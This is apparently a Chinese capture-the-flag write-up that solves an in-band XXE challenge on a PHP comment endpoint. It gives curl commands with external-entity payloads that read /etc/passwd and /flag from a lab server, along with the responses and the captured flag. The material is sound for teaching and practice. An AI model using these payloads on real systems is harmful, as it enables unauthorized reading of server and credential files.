# 27 - XXE Classic Read（有回显 XXE 读文件）

> 目标：`http://47.120.76.57:34935`
> Flag：`TOGOGO-flag{cbb62dc9-9e83-4283-a08a-129bcf3f16a2}`

## 一、题目长啥样（30 秒看懂）

打开首页就能看到一段「使用说明」：

- 接口：`POST /`，`Content-Type: application/xml`
- 示例 XML：
  ```xml
  <?xml version="1.0"?>
  <comment>
    <name>Alice</name>
    <content>hello</content>
  </comment>
  ```
- 服务端会把 `<name>` 的内容拼到 HTML 里回显：
  `<h2>Thanks, Alice!</h2>`

⚠️ 关键观察：**`<name>` 的内容会原样回显**，这就是天生的 XXE 数据载体。

---

## 二、漏洞原理（一句话版）

XML 允许你定义「外部实体」让 parser 去读文件：

```xml
<!ENTITY x SYSTEM "file:///flag">
```

只要在正文里写 `&x;`，parser 解析时就会把 `/flag` 的内容**替换**进去。
PHP 后端不知情，把替换后的字符串当作 `<name>` 回显出来 → flag 直接到手。

## 三、手工复刻（3 步走，复制粘贴即可）

### Step 1：基线探测（确认回显点）

任意工具发一发，确认 Alice 会被回显：

```bash
curl -X POST http://47.120.76.57:34935/ \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><comment><name>Alice</name><content>hi</content></comment>'
```

期望响应：

```html
<h2>Thanks, Alice!</h2>
<p>Your comment:</p>
<pre>hi</pre>
```

### Step 2：试金石（验证 XXE 是否开启）

用 `/etc/passwd` 当试纸（Linux 必有、纯 ASCII、容易识别）：

```bash
curl -X POST http://47.120.76.57:34935/ \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<comment><name>&x;</name><content>c</content></comment>'
```

如果响应里出现 `root:x:0:0:...`，恭喜：**XXE 成立、file:// 可用**。

### Step 3：读 flag

把 URI 换成 `/flag`（题目背景告诉我们 flag 在 Web 根外的 `/flag`）：

```bash
curl -X POST http://47.120.76.57:34935/ \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<comment><name>&x;</name><content>c</content></comment>'
```

实际响应：

```html
<h2>Thanks, TOGOGO-flag{cbb62dc9-9e83-4283-a08a-129bcf3f16a2} !</h2>
<p>Your comment:</p>
<pre>c</pre>
```

🚩 `TOGOGO-flag{cbb62dc9-9e83-4283-a08a-129bcf3f16a2}`

## 四、Payload 逐行解释

```xml
<?xml version="1.0"?>                       <!-- XML 声明 -->
<!DOCTYPE r [                               <!-- 内部 DTD 开始，根元素叫 r 即可 -->
  <!ENTITY x SYSTEM "file:///flag">         <!-- 定义外部实体 x，指向本地 /flag -->
]>
<comment>
  <name>&x;</name>                          <!-- 引用实体，parser 会先读文件再替换 -->
  <content>c</content>
</comment>
```

执行流：

1. PHP libxml 解析这段 XML
2. 看到 `&x;` → 查 DTD → 是 `SYSTEM file:///flag`
3. libxml 真的去 `open("/flag")`、读取内容
4. 内容替换到 `&x;` 位置 → `$comment->name = "TOGOGO-flag{...}"`
5. PHP 拼到 `<h2>Thanks, ...!</h2>` 返回 → flag 在响应里

## 五、文件不存在 ≠ 没漏洞

试探不同路径时常见现象：

| 路径                 | 现象             | 含义                  |
| -------------------- | ---------------- | --------------------- |
| `/flag`              | 200，回显 flag   | ✅ 命中               |
| `/flag.txt`          | 400              | parser 读不到文件报错 |
| `/var/www/html/flag` | 400              | Web 目录里没有        |
| `/etc/passwd`        | 200，回显 passwd | XXE 本身没问题        |

**关键判断**：只要 `/etc/passwd` 能读出来，剩下的就是猜 flag 文件名。本题题面提示 `/flag`，省事。
